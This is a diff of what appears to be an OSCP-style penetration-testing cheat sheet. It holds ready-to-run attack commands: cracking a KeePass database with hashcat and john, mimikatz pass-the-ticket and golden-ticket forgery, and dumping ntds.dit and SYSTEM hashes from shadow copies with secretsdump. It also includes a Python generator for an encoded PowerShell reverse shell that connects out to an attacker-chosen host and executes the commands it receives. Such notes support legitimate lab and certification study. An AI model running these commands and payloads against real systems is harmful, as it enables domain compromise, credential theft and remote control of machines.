 keepass2john Database.kdbx > keepass.hash
-hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule (#Password - welcome)
-john keepass.hash(#Password - welcome)
+cut -d: -f2- keepass.hash > keepass.hashcat
+hashcat -m 13400 keepass.hashcat /usr/share/wordlists/rockyou.txt # Add -r <RULE_FILE> only when that file exists.
+john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
 ```
-Cracking the Kdbx file with kpcli
+Opening the KDBX file with a known password in kpcli (kpcli is not the cracker)
 ```
->kpcli --kdb=Database.kdbx (#Password - welcome)
+kpcli --kdb=Database.kdbx # Enter the recovered password at the prompt.
 >ls
 >cd Databases
 >cd Windows
 >show emma
-#Password show in hide RED, select with mouse it will unhide multiple times. 
+# Use help show for your installed version; hidden output is not secure redaction.
 ```
 
-### Pass the ticket
+#### Pass the ticket
 
 ```powershell
 .\mimikatz.exe
@@ -2245,13 +2442,13 @@ klist
 dir \\<RHOST>\admin$
 ```
 
-### DCOM
+#### DCOM
 
 DCOM execution requires a reachable RPC endpoint mapper and dynamic RPC ports, remote activation permissions, and a suitable registered COM application. Current Windows DCOM hardening can invalidate old clients. The former truncated encoded payload was not executable and has been removed.
 
 Use the maintained [Impacket DCOM example and its installed help](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py) for supported methods. Validate access with a harmless identity check before relying on a shell.
 
-### Golden Ticket
+#### Golden Ticket
 
 Historical lab example. An arbitrary username and an old RC4-only recipe are not universally accepted on patched domains. Confirm principal, key material, encryption and PAC requirements before using the [upstream tool](https://github.com/gentilkiwi/mimikatz). See [chain compatibility](docs/command-audit.md#recheck-every-transition-in-a-chain).
 
@@ -2275,25 +2472,27 @@ kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698
 
 1. Obtaining access!
 
-```powershell
+```text
 mimikatz.exe #no need for highest privileges
 kerberos::ptt golden
 misc::cmd #we're accessing cmd
 ```
 
-### Shadow Copies
+#### Shadow Copies
 
-```powershell
-vshadow.exe -nw -p C:
+Historical mixed transcript: run VShadow, copy and registry commands on the Windows DC with sufficient backup/read privileges; transfer the matching NTDS and SYSTEM backups to Kali for `impacket-secretsdump`. Replace the hardcoded shadow-copy number with the actual device path returned by VShadow.
+
+```text
+vshadow.exe -nw -p C:\
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
 reg.exe save hklm\system c:\system.bak
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
-## Windows PowerShell payload encoding
+### Windows PowerShell payload encoding
 <a href="https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
 ">GitHub link</a>
 <a href="https://discord.com/channels/780824470113615893/1087927556604432424/1271916461442728098"> Discord Chat</a>
-```powershell 
+```python
 #!/usr/bin/env python3
 #
 # generate reverse powershell cmdline with base64 encoded args
@@ -2318,12 +2517,12 @@ except:
 payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 payload = payload % (ip, port)
 
-cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+cmdline = "powershell -e " + base64.b64encode(payload.encode('utf-16le')).decode()
 
 print(cmdline)
 ```
 
-# References
+## References
 
 [![](https://github.com/saisathvik1.png?size=50)](https://github.com/saisathvik1)
 [![](https://github.com/swisskyrepo.png?size=50)](https://github.com/swisskyrepo)
